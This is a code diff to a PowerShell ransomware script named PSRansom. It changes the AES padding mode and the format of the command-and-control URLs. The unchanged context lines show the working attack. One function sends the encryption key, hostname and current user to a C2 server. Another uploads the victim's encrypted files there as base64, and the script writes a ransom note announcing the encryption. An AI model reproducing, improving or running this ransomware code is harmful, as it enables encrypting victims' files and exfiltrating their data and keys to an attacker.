@@ -83,7 +83,7 @@ function Invoke-AESEncryption {
       $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
       $aesManaged = New-Object System.Security.Cryptography.AesManaged
       $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
-      $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+      $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
       $aesManaged.BlockSize = 128
       $aesManaged.KeySize = 256 }
 
@@ -246,7 +246,7 @@ function ShowInfo {
    Write-Host "[+] Current Time: " -NoNewLine -ForegroundColor Yellow ; Write-Host $time }
 
 function GetStatus {
-   Try { Invoke-WebRequest -useb "http://$C2Server`:$C2Port/status" -Method GET 
+   Try { Invoke-WebRequest -useb "$C2Server`:$C2Port/status" -Method GET 
       Write-Host "[i] Command & Control Server is up!" -ForegroundColor Green }
    Catch { Write-Host "[!] Command & Control Server is down!" -ForegroundColor Red }}
 
@@ -255,11 +255,11 @@ function SendResults {
    $C2Data = " [+] Key: $B64Key [+] Hostname: $computer [+] Current User: $domain$user [+] Current Time: $time"
    $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "PSRansom!" -NotMatch
    $B64Data = R64Encoder -t $C2Data ; $B64Logs = R64Encoder -t $RansomLogs
-   Invoke-WebRequest -useb "http://$C2Server`:$C2Port/data" -Method POST -Body $B64Data 2>&1> $null
-   Invoke-WebRequest -useb "http://$C2Server`:$C2Port/logs" -Method POST -Body $B64Logs 2>&1> $null }
+   Invoke-WebRequest -useb "$C2Server`:$C2Port/data" -Method POST -Body $B64Data 2>&1> $null
+   Invoke-WebRequest -useb "$C2Server`:$C2Port/logs" -Method POST -Body $B64Logs 2>&1> $null }
 
 function SendOK {
-   Invoke-WebRequest -useb "http://$C2Server`:$C2Port/done" -Method GET 2>&1> $null }
+   Invoke-WebRequest -useb "$C2Server`:$C2Port/done" -Method GET 2>&1> $null }
 
 function CreateReadme {
    $ReadmeTXT = "All your files have been encrypted by PSRansom!`nBut don't worry, you can still recover them with the recovery key :)`n"
@@ -273,12 +273,12 @@ function EncryptFiles {
       Add-Content -Path "$Directory$slash$Readme" -Value "[!] No files have been encrypted!" }}
 
 function ExfiltrateFiles {
-   Invoke-WebRequest -useb "http://$C2Server`:$C2Port/files" -Method GET 2>&1> $null 
+   Invoke-WebRequest -useb "$C2Server`:$C2Port/files" -Method GET 2>&1> $null 
    $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "No files have been encrypted!" ; if (!$RansomLogs) {
    foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
       $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile
-      Invoke-WebRequest -useb "http://$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
-   else { $B64Name = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "http://$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
+      Invoke-WebRequest -useb "$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
+   else { $B64Name = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
 
 function DecryptFiles {
    foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
